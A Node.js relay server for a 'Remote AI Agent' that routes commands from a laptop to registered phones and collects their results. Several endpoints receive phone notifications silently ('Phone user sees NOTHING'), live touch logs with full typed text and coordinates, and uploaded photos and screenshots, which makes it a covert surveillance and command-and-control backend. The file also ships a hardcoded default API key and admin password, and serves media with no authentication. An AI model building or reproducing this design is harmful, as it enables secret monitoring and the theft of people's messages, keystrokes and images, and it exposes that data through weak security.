// server.js
// ============ CLOUD RELAY SERVER v3 ============
// Command ID matching + result queue + MULTI-DEVICE registry

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = process.env.API_KEY || 'Gokul_Secret_Agent_99';

// Middleware
app.use(cors());
app.use(express.json({ limit: '100mb' }));

// Storage
const commands = new Map();   // id -> {command, device, target_device, timestamp}
const results = new Map();    // id -> {result, device_id, timestamp}
const devices = new Map();    // device_id -> {name, model, lastSeen, registeredAt}
const MAX_AGE = 10 * 60 * 1000; // 10 min cleanup
const ONLINE_WINDOW_MS = 20 * 1000; // device online if lastSeen < 20s ago

// v8.2: silent notification batches — device_id -> [{ts, entries}]
// In-memory, consume-once. The phone uploads raw notification strings here;
// the laptop AI fetches + summarizes. Phone user sees NOTHING.
const notifBatches = new Map();
const NOTIF_BATCH_CAP = 200;   // per-device cap
const NOTIF_ENTRY_CAP = 4000;  // per-upload entry char cap

// v8.8: media store — phone uploads photos/videos/screenshots (base64) and the
// laptop downloads them via a shareable URL. In-memory (Render free tier).
const mediaStore = new Map();   // media_id -> {mime, data_b64, ts, filename}
const MEDIA_CAP = 50;           // max stored files (FIFO eviction)
const MEDIA_TTL_MS = 60 * 60 * 1000;  // 1 hour expiry

// Dashboard stats (in-memory, reset on server restart)
const startedAt = Date.now();
let totalCommands = 0;
let totalResults = 0;
const commandHistory = [];    // max 200: {ts, command}

// Cleanup old entries every 2 min
setInterval(() => {
    const now = Date.now();
    for (const [id, cmd] of commands) {
        if (now - new Date(cmd.timestamp).getTime() > MAX_AGE) commands.delete(id);
    }
    for (const [id, res] of results) {
        if (now - new Date(res.timestamp).getTime() > MAX_AGE) results.delete(id);
    }
    // Devices poll every ~5s — anything unseen for 5 min is gone.
    // Keeps the /devices registry from growing forever with stale phones.
    for (const [id, d] of devices) {
        if (now - d.lastSeen > 5 * 60 * 1000) devices.delete(id);
    }
}, 120000);

// API Key Authentication
function authMiddleware(req, res, next) {
    const apiKey = req.headers['x-api-key'];
    if (!apiKey || apiKey !== API_KEY) {
        return res.status(401).json({ error: 'Unauthorized - Wrong API Key' });
    }
    next();
}

// ---------- Multi-device helpers (v6) ----------

// Touch a device's lastSeen. Creates a minimal registry entry when an
// unregistered device polls (so /devices still shows it).
function touchDevice(deviceId) {
    const id = deviceId || 'legacy';
    let entry = devices.get(id);
    if (!entry) {
        entry = { name: id, model: null, lastSeen: Date.now(), registeredAt: Date.now() };
        devices.set(id, entry);
    } else {
        entry.lastSeen = Date.now();
    }
    return entry;
}

// Is a pending command meant for this polling device?
// 'legacy'/'any' targeted commands are also visible to registered devices
// (single-device compat: updated app + no explicit selection still works),
// but device-specific commands NEVER leak to other devices or old clients.
function commandMatchesDevice(cmd, deviceId) {
    const target = cmd.target_device || cmd.device || 'legacy';
    if (target === 'legacy' || target === 'any') {
        return true; // any poller may serve an untargeted command
    }
    if (deviceId === 'legacy' || deviceId === 'any') {
        return false; // old clients must not consume targeted commands
    }
    return target === deviceId;
}

function deviceSummary() {
    return [...devices.entries()]
        .sort((a, b) => b[1].lastSeen - a[1].lastSeen)
        .map(([id, d]) => ({
            device_id: id,
            name: d.name || id,
            model: d.model || null,
            last_seen: new Date(d.lastSeen).toISOString(),
            last_seen_age_sec: Math.floor((Date.now() - d.lastSeen) / 1000),
            online: (Date.now() - d.lastSeen) < ONLINE_WINDOW_MS,
        }));
}

// Health Check
app.get('/health', (req, res) => {
    const summary = deviceSummary();
    // Backward compat: mobile_last_seen points at the most recent device
    const mostRecent = summary[0] || null;
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        mobile_last_seen: mostRecent ? mostRecent.last_seen : null,
        pending_commands: commands.size,
        pending_results: results.size,
        devices: summary.map(d => ({
            device_id: d.device_id,
            name: d.name,
            online: d.online,
        })),
        device_count: summary.length,
        devices_online: summary.filter(d => d.online).length,
        stats: {
            total_commands: totalCommands,
            total_results: totalResults,
            uptime_sec: Math.floor((Date.now() - startedAt) / 1000),
            started_at: new Date(startedAt).toISOString(),
            command_history: commandHistory,
        },
    });
});

// Laptop → Server: Command anupum (returns command ID)
// v6: optional target_device routes the command to one specific phone
// (omit = 'legacy' → served to old clients + selected default device)
app.post('/send_command', authMiddleware, (req, res) => {
    // v7.1 sweep: device_id in body is accepted as an alias for target_device
    // (some clients send device_id instead — route it correctly, don't drop it)
    const { command, device, target_device, device_id, timeout_ms } = req.body;
    const target = target_device || device_id || 'legacy';

    if (!command) {
        return res.status(400).json({ error: 'Command is required' });
    }

    const id = crypto.randomUUID();
    commands.set(id, {
        command,
        device: device || 'mobile',
        target_device: target,
        timestamp: new Date().toISOString(),
    });

    // dashboard stats
    totalCommands += 1;
    commandHistory.push({ ts: Date.now(), command: String(command).slice(0, 60) });
    if (commandHistory.length > 200) commandHistory.shift();

    console.log(`[${new Date().toISOString()}] CMD ${id.slice(0, 8)} -> ${target}: ${command.slice(0, 80)}`);
    res.json({ status: 'command_sent', id, target_device: target });
});

// Laptop → Server: Wait for result (long-poll up to timeout)
app.get('/get_result', authMiddleware, async (req, res) => {
    const { id, timeout_ms } = req.query;
    const timeout = Math.min(parseInt(timeout_ms) || 25000, 55000);
    const start = Date.now();

    if (!id) {
        // Legacy mode: return latest result
        const latest = [...results.values()].sort(
            (a, b) => new Date(b.timestamp) - new Date(a.timestamp)
        )[0];
        return res.json(latest ? { result: latest.result } : { result: null });
    }

    // Long-poll: wait until result arrives or timeout
    while (Date.now() - start < timeout) {
        if (results.has(id)) {
            const { result } = results.get(id);
            results.delete(id); // consume
            return res.json({ id, result });
        }
        await new Promise(r => setTimeout(r, 500));
    }

    res.status(408).json({ error: 'Mobile result timeout — mobile online-la irukkanum', id });
});

// Mobile → Server: Poll pannum (command edukkum)
// v6: optional device_id in body routes commands per-device. Old clients
// that send no device_id poll as 'legacy' and only get legacy/any commands.
app.post('/mobile_poll', authMiddleware, (req, res) => {
    // device_id: JSON body first, X-Device-Id header as fallback, else 'legacy'
    const device_id = (req.body && req.body.device_id)
        || req.headers['x-device-id']
        || 'legacy';
    touchDevice(device_id);

    // Oldest pending command for THIS device eduthu delete pannu
    const oldest = [...commands.entries()]
        .filter(([, c]) => commandMatchesDevice(c, device_id))
        .sort((a, b) => new Date(a[1].timestamp) - new Date(b[1].timestamp))[0];

    if (oldest) {
        const [id, cmd] = oldest;
        commands.delete(id);
        return res.json({ id, command: cmd.command, timestamp: cmd.timestamp, device_id });
    }
    res.json({ command: null, device_id });
});

// Mobile → Server: Result anupum (with command ID)
// v6: optional device_id in body is stored with the result
app.post('/mobile_result', authMiddleware, (req, res) => {
    const { id, result, device_id } = req.body;

    if (result === undefined || result === null) {
        return res.status(400).json({ error: 'Result is required' });
    }

    if (device_id) touchDevice(device_id);

    results.set(id || 'legacy', {
        result: String(result).slice(0, 20000000), // 20MB cap (was 2MB)
        device_id: device_id || null,
        timestamp: new Date().toISOString(),
    });

    totalResults += 1;

    console.log(`[${new Date().toISOString()}] RESULT ${(id || 'legacy').slice(0, 8)}${device_id ? ` (${device_id})` : ''}: ${String(result).slice(0, 60)}`);
    res.json({ status: 'result_received' });
});

// ---------- v6 MULTI-DEVICE endpoints ----------

// Mobile → Server: register/refresh this device in the registry
app.post('/register_device', authMiddleware, (req, res) => {
    const device_id = (req.body && req.body.device_id) || req.headers['x-device-id'];
    const { name, model } = req.body || {};
    if (!device_id) {
        return res.status(400).json({ error: 'device_id is required' });
    }
    const existing = devices.get(device_id);
    devices.set(device_id, {
        name: name || (existing && existing.name) || device_id,
        model: model !== undefined ? model : (existing && existing.model) || null,
        lastSeen: Date.now(),
        registeredAt: (existing && existing.registeredAt) || Date.now(),
    });
    console.log(`[${new Date().toISOString()}] REGISTER device '${device_id}' (${name || '?'})`);
    res.json({ ok: true, device_id });
});

// Laptop/UI → Server: list all registered devices (newest first)
app.get('/devices', authMiddleware, (req, res) => {
    res.json({ devices: deviceSummary() });
});

// Laptop → Server: enqueue the SAME command for ALL ONLINE devices
app.post('/broadcast', authMiddleware, (req, res) => {
    const { command } = req.body;
    if (!command) {
        return res.status(400).json({ error: 'Command is required' });
    }
    const now = Date.now();
    const onlineIds = [...devices.entries()]
        .filter(([, d]) => (now - d.lastSeen) < ONLINE_WINDOW_MS)
        .map(([id]) => id);

    const ids = [];
    for (const devId of onlineIds) {
        const id = crypto.randomUUID();
        commands.set(id, {
            command,
            device: 'mobile',
            target_device: devId,
            timestamp: new Date().toISOString(),
        });
        ids.push(id);
    }
    totalCommands += 1;
    commandHistory.push({ ts: Date.now(), command: `[broadcast x${ids.length}] ${String(command).slice(0, 40)}` });
    if (commandHistory.length > 200) commandHistory.shift();

    console.log(`[${new Date().toISOString()}] BROADCAST to ${ids.length} device(s): ${command.slice(0, 80)}`);
    res.json({ ok: true, ids, count: ids.length, devices: onlineIds });
});

// ---------- v8.1: Admin panel + life log ----------

// token -> expiry (ms). 1-hour sessions.
const adminSessions = new Map();
const ADMIN_TTL_MS = 60 * 60 * 1000;

// Life log store: stream_type -> [{device_id, ts, entry}] (capped, in-memory)
const lifeLogPublic = [];
const lifeLogPrivate = [];
const LIFELOG_CAP = 1000;

function requireAdmin(req, res, next) {
    const token = req.headers['x-admin-token'];
    if (!token || !adminSessions.has(token)) {
        return res.status(403).json({ error: 'Forbidden - admin token required' });
    }
    if (Date.now() > adminSessions.get(token)) {
        adminSessions.delete(token);
        return res.status(403).json({ error: 'Forbidden - admin session expired' });
    }
    next();
}

// POST /admin/login {password} -> {ok, token, expires_in}
app.post('/admin/login', authMiddleware, (req, res) => {
    const password = (req.body && req.body.password) || '';
    const expected = process.env.ADMIN_PASSWORD || 'admin_agent';
    if (password !== expected) {
        return res.status(401).json({ ok: false, error: 'Wrong admin password' });
    }
    // token = sha256(password + random secret)
    const secret = crypto.randomBytes(24).toString('hex');
    const token = crypto.createHash('sha256')
        .update(password + secret).digest('hex');
    const expiry = Date.now() + ADMIN_TTL_MS;
    adminSessions.set(token, expiry);
    console.log(`[${new Date().toISOString()}] ADMIN login ok (session 1h)`);
    res.json({ ok: true, token, expires_in: 3600 });
});

// GET /life_log/public - masked stream (API key only)
app.get('/life_log/public', authMiddleware, (req, res) => {
    res.json({ ok: true, stream: 'public', count: lifeLogPublic.length,
               entries: lifeLogPublic.slice(-1000) });
});

// GET /life_log/admin - FULL private stream (API key + admin token)
app.get('/life_log/admin', authMiddleware, requireAdmin, (req, res) => {
    res.json({ ok: true, stream: 'private', count: lifeLogPrivate.length,
               entries: lifeLogPrivate.slice(-1000) });
});

// POST /life_log/upload {device_id, stream_type, entries:[]}
app.post('/life_log/upload', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id) || req.headers['x-device-id'] || 'legacy';
    const streamType = (req.body && req.body.stream_type) || 'public';
    const entries = (req.body && Array.isArray(req.body.entries)) ? req.body.entries : [];
    const store = streamType === 'private' ? lifeLogPrivate : lifeLogPublic;
    const now = Date.now();
    for (const e of entries.slice(0, 1000)) {
        store.push({ device_id: deviceId, ts: now, entry: String(e).slice(0, 200) });
    }
    while (store.length > LIFELOG_CAP) store.shift();
    res.json({ ok: true, stored: Math.min(entries.length, 1000), stream: streamType });
});

// ---------- v8.2: Silent notification batches ----------

// Mobile → Server: upload raw notification strings (consumer gets them later)
app.post('/notif_upload', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id)
        || req.headers['x-device-id']
        || 'legacy';
    const entries = (req.body && typeof req.body.entries === 'string')
        ? req.body.entries : '';
    if (!entries) {
        return res.json({ ok: true, stored: 0, device_id: deviceId });
    }
    let arr = notifBatches.get(deviceId);
    if (!arr) {
        arr = [];
        notifBatches.set(deviceId, arr);
    }
    arr.push({ ts: Date.now(), entries: entries.slice(0, NOTIF_ENTRY_CAP) });
    while (arr.length > NOTIF_BATCH_CAP) arr.shift();
    touchDevice(deviceId);
    console.log(`[${new Date().toISOString()}] NOTIF upload ${deviceId}: ${entries.slice(0, 60)}`);
    res.json({ ok: true, stored: 1, device_id: deviceId });
});

// Laptop → Server: fetch the latest pending batch (consume-once)
app.get('/notif_fetch', authMiddleware, (req, res) => {
    const deviceId = req.query.device_id;
    if (deviceId && notifBatches.has(deviceId)) {
        const arr = notifBatches.get(deviceId);
        notifBatches.delete(deviceId);
        return res.json({ entries: arr.map(b => b.entries).join('\n') });
    }
    // No specific device (legacy/single-device mode): drain everything.
    const parts = [];
    for (const [, arr] of notifBatches) {
        parts.push(...arr.map(b => b.entries));
    }
    notifBatches.clear();
    res.json({ entries: parts.join('\n') });
});

// ---------- v8.5: Live touch/activity tracking ----------

// device_id -> [{ts, entries}] — phone uploads raw touch/click/activity lines,
// laptop fetches them live (consume-once) for the Touch Activity tab.
const touchBatches = new Map();
const TOUCH_BATCH_CAP = 200;
const TOUCH_ENTRY_CAP = 8000;

// Mobile → Server: upload raw touch/activity lines
app.post('/touch_upload', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id)
        || req.headers['x-device-id']
        || 'legacy';
    const entries = (req.body && typeof req.body.entries === 'string')
        ? req.body.entries : '';
    if (!entries) {
        return res.json({ ok: true, stored: 0, device_id: deviceId });
    }
    let arr = touchBatches.get(deviceId);
    if (!arr) {
        arr = [];
        touchBatches.set(deviceId, arr);
    }
    arr.push({ ts: Date.now(), entries: entries.slice(0, TOUCH_ENTRY_CAP) });
    while (arr.length > TOUCH_BATCH_CAP) arr.shift();
    touchDevice(deviceId);
    res.json({ ok: true, stored: 1, device_id: deviceId });
});

// Laptop → Server: fetch latest pending touch batch (consume-once).
// NOTE: the "admin-only" gate lives in the laptop tool (fetch_touch_events
// checks admin_auth, same as life_log_read_private) — this stream now carries
// full typed text + coordinates.
app.get('/touch_fetch', authMiddleware, (req, res) => {
    const deviceId = req.query.device_id;
    if (deviceId && touchBatches.has(deviceId)) {
        const arr = touchBatches.get(deviceId);
        touchBatches.delete(deviceId);
        return res.json({ device_id: deviceId, entries: arr.map(b => b.entries).join('\n'), count: arr.length });
    }
    // No specific device: drain everything (legacy/single view).
    const parts = [];
    let n = 0;
    for (const [, arr] of touchBatches) {
        parts.push(...arr.map(b => b.entries));
        n += arr.length;
    }
    touchBatches.clear();
    res.json({ entries: parts.join('\n'), count: n });
});

// ---------- v8.8: media upload + download link ----------

// Phone → Server: upload a media file (base64) → get a download link back.
app.post('/media_upload', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id) || req.headers['x-device-id'] || 'legacy';
    const data = (req.body && req.body.data_b64) || '';
    const mime = (req.body && req.body.mime) || 'application/octet-stream';
    const filename = (req.body && req.body.filename) || null;
    if (!data) {
        return res.status(400).json({ error: 'data_b64 is required' });
    }
    const id = crypto.randomUUID();
    mediaStore.set(id, { mime, data, ts: Date.now(), filename, device_id: deviceId });
    // FIFO eviction by cap + TTL
    if (mediaStore.size > MEDIA_CAP) {
        const oldest = mediaStore.keys().next().value;
        mediaStore.delete(oldest);
    }
    for (const [mid, m] of mediaStore) {
        if (Date.now() - m.ts > MEDIA_TTL_MS) mediaStore.delete(mid);
    }
    touchDevice(deviceId);
    console.log(`[${new Date().toISOString()}] MEDIA upload ${deviceId}: ${mime} (${data.length} b64 chars)`);
    res.json({ ok: true, media_id: id, url: `/media/${id}` });
});

// Laptop → Server: download a media file by id (binary, for browser/download).
// No auth middleware (so the shareable URL opens in a plain browser/download).
app.get('/media/:id', (req, res) => {
    const m = mediaStore.get(req.params.id);
    if (!m) {
        return res.status(404).send('media not found or expired');
    }
    if (m.filename) {
        res.set('Content-Disposition', `inline; filename="${String(m.filename).replace(/"/g, '')}"`);
    }
    res.set('Content-Type', m.mime);
    res.send(Buffer.from(m.data, 'base64'));
});

// Start
app.listen(PORT, () => {
    console.log('='.repeat(50));
    console.log('🤖 Remote AI Agent - Cloud Server v3 (multi-device)');
    console.log('='.repeat(50));
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ API Key: ${API_KEY.substring(0, 5)}...`);
    console.log(`✅ Health: http://localhost:${PORT}/health`);
    console.log('='.repeat(50));
});
